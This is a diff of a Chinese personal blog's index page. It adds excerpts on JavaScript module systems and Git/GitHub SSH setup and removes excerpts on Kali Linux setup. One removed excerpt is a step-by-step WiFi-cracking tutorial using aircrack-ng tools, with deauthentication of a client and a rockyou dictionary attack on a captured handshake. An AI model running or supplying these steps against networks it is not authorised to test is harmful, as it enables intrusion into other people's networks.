@@ -195,6 +195,129 @@
             <div class="postShorten-header">
                 <h1 class="postShorten-title" itemprop="headline">
                     
+                        <a class="link-unstyled" href="/2017/04/21/JavaScript/Modules/">
+                            JavaScript 模块化
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time itemprop="datePublished" datetime="2017-04-21T20:10:16+08:00">
+	
+		    4月 21, 2017
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content" itemprop="articleBody">
+                    <h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p>首先，最先出现的是 <code>CommonJS</code>，  <code>CommonJS API</code> 定义很多普通应用程序（主要指非浏览器的应用）使用的API。它的终极目标是提供一个类似 <code>Python</code>， <code>Ruby</code> 和 <code>Java</code> 标准库。这样的话，开发者可以使用 <code>CommonJS API</code> 编写应用程序，然后这些应用可以运行在不同的 <code>JavaScript</code> 解释器和不同的主机环境中。</p>
+<p>2009年，美国程序员 <code>Ryan Dahl</code> 创造了 <code>node.js</code> 项目，将 <code>javascript</code> 语言用于服务器端编程。这标志 <code>Javascript</code> 模块化编程”正式诞生。</p>
+<p><code>NodeJS</code> 是 <code>CommonJS</code> 规范的实现， <code>webpack</code>  也是以 <code>CommonJS</code> 的形式来书写。<code>NPM</code> 作为 <code>Node</code> 的包管理器，帮助<code>Node</code> 解决依赖包的安装问题，也要遵循 <code>CommonJS</code>。</p>
+<h4 id="Browserify"><a href="#Browserify" class="headerlink" title="Browserify"></a>Browserify</h4><p><a href="http://browserify.org/" target="_blank" rel="external">browserify</a> 是最常用的 <code>CommonJS</code> 转换工具。</p>
+<p>然后看个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// foo.js</span><br><span class="line">module.exports = function(x) &#123;</span><br><span class="line">  console.log(x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">var foo = require(&quot;./foo&quot;);</span><br><span class="line">foo(&quot;Hi&quot;);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ browserify main.js &gt; compiled.js</span><br></pre></td></tr></table></figure>
+<p>即可打包，<code>Browserify</code> 具体做了什么继续向下看即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install browser-unpack -g</span><br></pre></td></tr></table></figure></p>
+<p>然后我们将上面生成的 <code>compiled.js</code> 解包。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ browser-unpack &lt; compiled.js</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;:1,</span><br><span class="line">    &quot;source&quot;:&quot;module.exports = function(x) &#123;\n  console.log(x);\n&#125;;&quot;,</span><br><span class="line">    &quot;deps&quot;:&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;:2,</span><br><span class="line">    &quot;source&quot;:&quot;var foo = require(\&quot;./foo\&quot;);\nfoo(\&quot;Hi\&quot;);&quot;,</span><br><span class="line">    &quot;deps&quot;:&#123;&quot;./foo&quot;:1&#125;,</span><br><span class="line">    &quot;entry&quot;:true</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p><code>Browserify</code> 在这里将所有模块放到一个数组里，<code>id</code> 是模块的编号，<code>source</code> 是源码，<code>deps</code> 为依赖，<code>entry</code> 为指定入口。</p>
+<p><code>Browserify</code> 先找到 <code>entry: true</code> 的地方，然后执行 <code>source</code> 中的代码，遇到 <code>require</code> 就去<code>deps</code> 中寻找依赖，并执行所依赖的代码，将结果赋值给 <code>require</code> 前的变量。</p>
+<h2 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h2><p><code>AMD</code> ( Asynchronous Module Definition )，是为了解决 <code>CommonJS</code> 不能异步加载的问题。<code>AMD</code> 采用异步的方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等加载完成后，这个回调函数才会执行。</p>
+<p><code>AMD</code> 也采用 <code>require()</code> 语句加载模块，但是不同于 <code>CommonJS</code>，它要求两个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require([module], callback);</span><br></pre></td></tr></table></figure></p>
+<p>第一个参数 <code>[module]</code> ，是一个数组，里面的成员就是要加载的模块；第二个参数 <code>callback</code> ，则是加载成功之后的回调函数。如果将前面的代码改写成 <code>AMD</code> 形式，就是下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require([&apos;math&apos;], function (math) &#123;</span><br><span class="line">　　math.add(2, 3);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><code>math.add()</code> 与 <code>math</code> 模块加载不是同步的，浏览器不会发生假死。所以很显然，<code>AMD</code> 比较适合浏览器环境。目前，主要有两个 <code>Javascript</code> 库实现了 <code>AMD</code> 规范： <a href="http://requirejs.org/" target="_blank" rel="external"><code>require.js</code></a> 和 <a href="https://github.com/cujojs/curl" target="_blank" rel="external"><code>curl.js</code></a>。</p>
+<h4 id="require-js"><a href="#require-js" class="headerlink" title="require.js"></a>require.js</h4><p>先去官方网站<a href="http://requirejs.org/docs/download.html" target="_blank" rel="external">下载</a>最新版本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后将它放到项目中即可</span><br></pre></td></tr></table></figure>
+<p>如果加载这个文件，也可能造成网页失去响应。解决办法有两个，一个是把它放在网页底部加载，另一个是写成下面这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;js/require.js&quot; defer async=&quot;true&quot; &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><code>async</code> 属性表明这个文件需要异步加载，避免网页失去响应。IE不支持这个属性，只支持 <code>defer</code>，所以把 <code>defer</code> 也写上。</p>
+<p>加载 <code>require.js</code> 以后，下一步就要加载我们自己的代码了。假定我们自己的代码文件是 <code>main.js</code> ，也放在 <code>js</code> 目录下面。那么，只需要写成下面这样就行了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;js/require.js&quot; data-main=&quot;js/main&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><code>data-main</code> 属性的作用是，指定网页程序的主模块。在上例中，就是js目录下面的 <code>main.js</code> ，这个文件会第一个被 <code>require.js</code>加载。由于 <code>require.js</code> 默认的文件后缀名是js，所以可以把 <code>main.js</code> 简写成 <code>main</code>。</p>
+<p>主模块的写法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// main.js</span><br><span class="line">require([&apos;moduleA&apos;, &apos;moduleB&apos;, &apos;moduleC&apos;], function (moduleA, moduleB, moduleC)&#123;</span><br><span class="line">　　// some code here</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>默认情况下，<code>require.js</code> 假定这三个模块与 <code>main.js</code> 在同一个目录，文件名分别为 <code>moduleA.js</code>，<code>moduleB.js</code> 和 <code>moduleA.js</code>，然后自动加载。</p>
+<p>使用 <code>require.config()</code> 方法，我们可以对模块的加载行为进行自定义。<code>require.config()</code> 就写在主模块（<code>main.js</code>）的头部。参数就是一个对象，这个对象的 <code>paths</code> 属性指定各个模块的加载路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">require.config(&#123;</span><br><span class="line">　　paths: &#123;</span><br><span class="line">　　　　&quot;jquery&quot;: &quot;jquery.min&quot;,</span><br><span class="line">　　　　&quot;underscore&quot;: &quot;underscore.min&quot;,</span><br><span class="line">　　　　&quot;backbone&quot;: &quot;backbone.min&quot;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h4 id="模块的写法"><a href="#模块的写法" class="headerlink" title="模块的写法"></a>模块的写法</h4><p>模块必须采用特定的 <code>define()</code> 函数来定义。如果一个模块不依赖其他模块，那么可以直接定义在 <code>define()</code> 函数之中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">define(function ()&#123;</span><br><span class="line"> 　var add = function (x,y)&#123;</span><br><span class="line">　　　　return x+y;</span><br><span class="line">　　&#125;;</span><br><span class="line">　　return &#123;</span><br><span class="line">　　　　add: add</span><br><span class="line">　　&#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="ES6-module"><a href="#ES6-module" class="headerlink" title="ES6 module"></a>ES6 module</h2><p>ES6发布的 <code>module</code> 并没有直接采用 <code>CommonJS</code> ，甚至连 <code>require</code> 都没有采用，也就是说 <code>require</code> 仍然只是 <code>node</code> 的一个私有的全局方法，<code>module.exports</code> 也只是 <code>node</code> 私有的一个全局变量属性，跟标准半毛钱关系都没有。</p>
+<p><a href="https://developer.mozilla.org/en/docs/web/javascript/reference/statements/export" target="_blank" rel="external">export 详细用法</a><br><a href="https://developer.mozilla.org/en/docs/web/javascript/reference/statements/import" target="_blank" rel="external">import 详细用法</a></p>
+<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><code>require</code> 的使用非常简单，它相当于 <code>module.exports</code> 的传送门，<code>module.exports</code> 后面的内容是什么，<code>require</code> 的结果就是什么，对象、数字、字符串、函数……再把 <code>require</code> 的结果赋值给某个变量，相当于把 <code>require</code> 和 <code>module.exports</code> 进行平行空间的位置重叠，而且 <code>require</code> 理论上可以运用在代码的任何地方，甚至不需要赋值给某个变量之后再使用。在使用时，完全可以忽略模块化这个概念来使用 <code>require</code>，仅仅把它当做一个 <code>node</code> 内置的全局函数，它的参数甚至可以是表达式：</p>
+<p>但是 <code>import</code> 则不同，它是编译时的（<code>require</code>是运行时的），它必须放在文件开头，而且使用格式也是确定的，不容置疑。它不会将整个模块运行后赋值给某个变量，而是只选择 <code>import</code> 的接口进行编译，这样在性能上比 <code>require</code> 好很多。</p>
+<p>从理解上，<code>require</code> 是赋值过程，<code>import</code> 是解构过程，当然，<code>require</code> 也可以将结果解构赋值给一组变量，但是 <code>import</code> 在遇到 <code>default</code> 时，和 <code>require</code> 则完全不同： <code>var $ = require(&#39;jquery&#39;);</code>  和 <code>import $ from &#39;jquery&#39;</code> 是完全不同的两种概念。</p>
+
+                    
+                        
+                    
+                    
+                        <p>
+                            <a href="/2017/04/21/JavaScript/Modules/#post-footer" class="postShorten-excerpt_link link">
+                                评论和共享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title" itemprop="headline">
+                    
+                        <a class="link-unstyled" href="/2017/04/04/Git/git_init/">
+                            Git 连接 Github
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time itemprop="datePublished" datetime="2017-04-04T13:30:44+08:00">
+	
+		    4月 04, 2017
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content" itemprop="articleBody">
+                    <h4 id="初始化邮箱用户名"><a href="#初始化邮箱用户名" class="headerlink" title="初始化邮箱用户名"></a>初始化邮箱用户名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">"shianqi@imudges.com"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"shianqi"</span></span><br></pre></td></tr></table></figure>
+<h4 id="生成SSH密钥"><a href="#生成SSH密钥" class="headerlink" title="生成SSH密钥"></a>生成SSH密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"shianqi@imudges.com"</span></span><br></pre></td></tr></table></figure>
+<p>windows 需要在 GitBush 中添加</p>
+<p>将密钥添加到 Github <a href="https://github.com/settings/keys" target="_blank" rel="external">设置</a>中</p>
+<h4 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+<p>出现下面的文本，则链接成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi shianqi! You&apos;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></p>
+
+                    
+                        
+                    
+                    
+                        <p>
+                            <a href="/2017/04/04/Git/git_init/#post-footer" class="postShorten-excerpt_link link">
+                                评论和共享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title" itemprop="headline">
+                    
                         <a class="link-unstyled" href="/2017/03/12/JavaScript/RegExp/">
                             JavaScript 正则表达式
                         </a>
@@ -1325,110 +1448,6 @@
         
     </article>
     
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title" itemprop="headline">
-                    
-                        <a class="link-unstyled" href="/2016/12/22/PenetrationTest/KaliUpdata/">
-                            Kali-Linux 更新、环境配置
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time itemprop="datePublished" datetime="2016-12-22T14:39:12+08:00">
-	
-		    12月 22, 2016
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content" itemprop="articleBody">
-                    <h1 id="kali-linux的更新源"><a href="#kali-linux的更新源" class="headerlink" title="kali linux的更新源:"></a>kali linux的更新源:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#kali官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure>
-<h1 id="对Kali进行清洁、更新、升级和发行版升级等处理"><a href="#对Kali进行清洁、更新、升级和发行版升级等处理" class="headerlink" title="对Kali进行清洁、更新、升级和发行版升级等处理"></a>对Kali进行清洁、更新、升级和发行版升级等处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure>
-<h1 id="汉化火狐浏览器"><a href="#汉化火狐浏览器" class="headerlink" title="汉化火狐浏览器"></a>汉化火狐浏览器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iceweasel-l10n-zh-cn</span><br></pre></td></tr></table></figure>
-<h1 id="安装中文输入法-搜狗"><a href="#安装中文输入法-搜狗" class="headerlink" title="安装中文输入法(搜狗)"></a>安装中文输入法(搜狗)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">dpkg -i sougoupinyinXXX.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><a href="http://os.51cto.com/art/201405/439494.htm" target="_blank" rel="external">http://os.51cto.com/art/201405/439494.htm</a><br><a href="http://blog.csdn.net/q_l_s/article/details/53185601" target="_blank" rel="external">http://blog.csdn.net/q_l_s/article/details/53185601</a></p>
-</blockquote>
-
-                    
-                        
-                    
-                    
-                        <p>
-                            <a href="/2016/12/22/PenetrationTest/KaliUpdata/#post-footer" class="postShorten-excerpt_link link">
-                                评论和共享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title" itemprop="headline">
-                    
-                        <a class="link-unstyled" href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/">
-                            用 Kali-Linux 进行 Wifi 破解
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time itemprop="datePublished" datetime="2016-12-20T09:43:12+08:00">
-	
-		    12月 20, 2016
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content" itemprop="articleBody">
-                    <h3>1.找一个字典文件</h3><br>这里用 Kali Linux 自带的<code>rockyou</code>字典，<br>使用前先解压。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlist/rockyou.txt.gz</span><br></pre></td></tr></table></figure><br><br><h3>2.断开链接的WiFi</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure><br><br>列出所有支持监控模式的网卡。<br><br><h3>3.监听网卡</h3>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-<p>此时网卡就处于监听模式，被监听的网卡变为 wlan0mon。<br><br>可使用<code>ifconfig</code>命令查看。</p>
-<p></p><h3>4.查看WiFi网络</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p></p>
-<p>可以看到周围WiFi的详细信息，包括信号强度、加密类型、频道(CH)等。<br><br>要记住破解WIFI的频道号和BSSID。</p>
-<p></p><h3>5.抓取握手包</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br></pre></td></tr></table></figure><p></p>
-<p><code>6</code> 频道号(CH)<br><br><code>C8:3A....</code> 目标BSSID号<br><br><code>-w</code> 抓取数据包保存位置<br></p>
-<p></p><h3>6.强制让设备重连WiFi</h3><br>原理：给链接到WiFi的一个设备发送一个deauth(反认证)包，让那个设备断开WiFi，<br>随后它自然会再次链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a C8:3A:35:60:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br></pre></td></tr></table></figure><p></p>
-<p><code>-0</code> 发送反认证包的个数 <br><br><code>-a</code> 指定路由器BSSID <br><br><code>-c</code> 指定强制断开的设备 <br></p>
-<p>成功监听到握手包后：<code>Ctrl+C</code> 结束抓包。<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure></p>
-<p>结束监听。</p>
-<p></p><h3>7.开始破解握手包密码</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b C8:3A:35:60:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure><p></p>
-<p><code>-a2</code>代表握手包 <br><br><code>-b</code> 指定要破解的WiFi BSSID <br><br><code>-w</code> 指定字典文件 <br><br>最后是抓取的包 <br></p>
-
-                    
-                        
-                    
-                    
-                        <p>
-                            <a href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/#post-footer" class="postShorten-excerpt_link link">
-                                评论和共享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
     <div class="pagination-bar">
     <ul class="pagination">
         
@@ -1539,25 +1558,6 @@
                 <div class="media">
                     
                     <div class="media-body">
-                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Event/">
-                            <h3 class="media-heading">JavaScript 事件捕获和冒泡</h3>
-                        </a>
-                        <span class="media-meta">
-                            <span class="media-date text-small">
-                                
-                                    2016年9月4日
-                                
-                            </span>
-                        </span>
-                        <div class="media-content hide-xs font-merryweather"></div>
-                    </div>
-                    <div style="clear:both;"></div>
-                    <hr>
-                </div>
-                
-                <div class="media">
-                    
-                    <div class="media-body">
                         <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Javascript/">
                             <h3 class="media-heading">JavaScript 简介</h3>
                         </a>
@@ -1598,6 +1598,25 @@
                     <div class="media-body">
                         <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/BrowserSync/BrowserSync/">
                             <h3 class="media-heading">BrowserSync 使用手册</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    2016年9月4日
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Event/">
+                            <h3 class="media-heading">JavaScript 事件捕获和冒泡</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -1714,7 +1733,7 @@
                 data-message-zero="没有找到文章"
                 data-message-one="找到 1 篇文章"
                 data-message-other="找到 {n} 篇文章">
-                找到 108 篇文章
+                找到 110 篇文章
             </p>
         </div>
     </div>
